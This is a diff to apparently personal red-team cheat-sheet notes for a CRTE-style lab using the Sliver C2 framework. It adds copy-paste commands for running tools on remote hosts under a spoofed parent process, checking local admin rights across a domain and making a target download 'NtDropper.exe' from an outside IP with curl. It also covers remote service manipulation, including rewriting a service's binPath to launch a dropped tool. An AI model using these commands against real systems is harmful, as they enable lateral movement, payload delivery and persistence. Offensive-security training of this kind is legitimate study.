@@ -51,12 +51,28 @@ In the CRTE we use https.
 
 ## Template
 
-For easy copy pasta. In a session, this will execute the specified local tool on the remote machine
+Useful commands for easy copy pasta
 
+#### Tool template
 ```sh
 execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:\Windows\System32\taskhostw.exe' -t 80 '/home/kali/Desktop/CRTE Tools/Sliver/someTool.exe'
 ```
-#### execute-assembly options
+
+#### WinRS command template
+```sh
+execute -o -S -t 50 cmd /c winrs -r:some-host "command"
+```
+
+#### Local Admin check for "someUser"
+```sh
+execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:\windows\system32\taskhostw.exe' -t 80 '/home/kali/Desktop/Tools/Sliver/LACheck.exe' 'winrm /ldap:servers-exclude-dc /threads:10 /domain:us.techcorp.local /user:someUser'
+```
+
+#### Download NtDropper.exe to 'some-target'
+```sh
+execute -o -S -t 20 winrs -r:some-target 'curl -o C:\Windows\Temp\NtDropper.exe --url http://192.168.100.83/NtDropper.exe'
+```
+## execute-assembly options
 | Options | Info |
 | ------ | ------ |
 | ```-A or --process-arguments``` | Args given to the process we're using
@@ -135,3 +151,35 @@ MD formatting wouldn't allow me to add | (pipe)
 
 - Most of the commands for ADSearch.exe can also be done using StandIn.exe (these wont be listed).
 - StandIn.exe uses the ```--ldap``` and ```--filter``` flags to perform LDAP queries.
+
+## Service Manipulation
+
+### sa-sc-enum
+Use this to enumerate services on a target.
+```sa-sc-enum <target>```
+
+We can also do this in WinRS for specific services - query config qc
+```execute -o -S -t 10 winrs -r:target 'sc qc some-service'```
+
+### remote-sc-*, and scshell
+Varrious armory commands to manipulate remote target services. We can also do this via WinRS.
+
+##### remotely stop a service
+```remote-sc-stop -t 25 "target" "service"```
+
+##### remotely start a service
+```remote-sc-start -t 25 "target" "service"```
+
+##### remotely change a service configuration
+```remote-sc-config -t 25 "target" "service" "binpath" errormode(0-3) startmode(0-4)```
+
+##### remote start service with winRS
+```execute -o -S -t 50 cmd /c winrs -r:TARGET -u:"SomeUser" -p:"Password" sc start some-service```
+###### NOTE: -u and -p are not always required, in some cases you can run the command without this
+
+##### remotely configure service with winRS
+```execute -o -S -t 50 cmd /c winrs -r:TARGET -u:"SomeUser" -p:"Password" sc config some-service binPath="C:\Windows\System32\cmd.exe /c start /b C:\Windows\Temp\SomeTool.exe toolArguments"```
+###### NOTE: as above, -u and -p are not always required
+###### NOTE: in some cases, you may need to also add start=auto to config
+```execute -o -S -t 50 cmd /c winrs -r:TARGET -u:"SomeUser" -p:"Password" sc config some-service start= auto```
+
